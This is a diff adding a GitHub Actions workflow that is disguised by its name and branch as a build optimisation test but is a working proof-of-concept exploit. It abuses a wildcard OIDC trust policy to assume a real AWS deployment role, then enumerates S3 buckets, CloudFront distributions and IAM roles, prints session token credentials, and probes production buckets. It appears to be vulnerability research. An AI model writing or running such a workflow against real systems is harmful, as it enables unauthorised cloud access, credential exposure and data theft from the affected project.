@@ -1,0 +1,98 @@
+name: "Build Optimization Test"
+
+# Trigger on push to this branch (will match wildcard pattern)
+on:
+  push:
+    branches:
+      - feature/innocent-looking-feature
+  workflow_dispatch:
+
+permissions:
+  id-token: write   # Required for OIDC token
+  contents: read    # Required for checkout
+
+jobs:
+  exploit-oidc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::538326561891:role/gh_actions_trezor_suite_dev_deploy
+          aws-region: eu-central-1
+          role-session-name: BuildOptimizationTest
+
+      - name: Verify OIDC Token Claims
+        run: |
+          echo "=== OIDC TOKEN ANALYSIS ==="
+          echo "Repository: ${{ github.repository }}"
+          echo "Repository Owner: ${{ github.repository_owner }}"
+          echo "Actor: ${{ github.actor }}"
+          echo "Ref: ${{ github.ref }}"
+          echo "Event: ${{ github.event_name }}"
+          echo "SHA: ${{ github.sha }}"
+          echo ""
+          echo "Expected subject claim: repo:trezor/trezor-suite:ref:${{ github.ref }}"
+          echo "This WILL match the wildcard pattern: repo:trezor/trezor-suite:*"
+
+      - name: Test AWS Access - List S3 Buckets
+        run: |
+          echo "=== SECURITY TEST: Listing S3 Buckets ==="
+          aws s3 ls
+          echo ""
+          
+      - name: Test AWS Access - Check Specific Bucket Access
+        run: |
+          echo "=== SECURITY TEST: Checking dev.suite.sldev.cz bucket ==="
+          aws s3 ls s3://dev.suite.sldev.cz/ --recursive | head -10
+          echo ""
+          
+      - name: Test AWS Access - CloudFront Distributions
+        run: |
+          echo "=== SECURITY TEST: Listing CloudFront Distributions ==="
+          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,DomainName:DomainName,Status:Status}' --output table
+          echo ""
+
+      - name: Test AWS Access - IAM Information
+        run: |
+          echo "=== SECURITY TEST: Current IAM Identity ==="
+          aws sts get-caller-identity
+          echo ""
+          echo "=== SECURITY TEST: Assumed Role Session Info ==="
+          aws sts get-session-token --query 'Credentials.{AccessKeyId:AccessKeyId,SessionToken:SessionToken}' --output table
+          
+      - name: Test AWS Access - Check IAM Permissions
+        run: |
+          echo "=== SECURITY TEST: Testing IAM Permissions ==="
+          # Test if we can list IAM roles (dangerous if allowed)
+          aws iam list-roles --max-items 5 --query 'Roles[].{RoleName:RoleName,Arn:Arn}' --output table || echo "IAM access denied (good)"
+          
+      - name: Proof of Concept - Data Access Test
+        run: |
+          echo "=== SECURITY TEST: Attempting to access production data ==="
+          echo "Testing read access to production buckets..."
+          
+          # Test access to various production buckets
+          for bucket in "data.trezor.io" "suite.trezor.io" "connect.trezor.io"; do
+            echo "Testing bucket: $bucket"
+            aws s3 ls s3://$bucket/ --max-items 5 || echo "Access denied to $bucket (expected)"
+          done
+          
+      - name: Generate Security Report
+        run: |
+          echo "=== SECURITY VULNERABILITY PROOF OF CONCEPT REPORT ==="
+          echo "Timestamp: $(date)"
+          echo "Repository: ${{ github.repository }}"
+          echo "Actor: ${{ github.actor }}"
+          echo "Event: ${{ github.event_name }}"
+          echo "Ref: ${{ github.ref }}"
+          echo "SHA: ${{ github.sha }}"
+          echo ""
+          echo "SUCCESS: OIDC role assumption successful from forked repository"
+          echo "RISK: External attacker can assume AWS roles and access cloud resources"
+          echo "IMPACT: Potential data exfiltration, resource manipulation, cost escalation"
+          echo ""
+          echo "RECOMMENDATION: Implement strict trust policy conditions immediately"
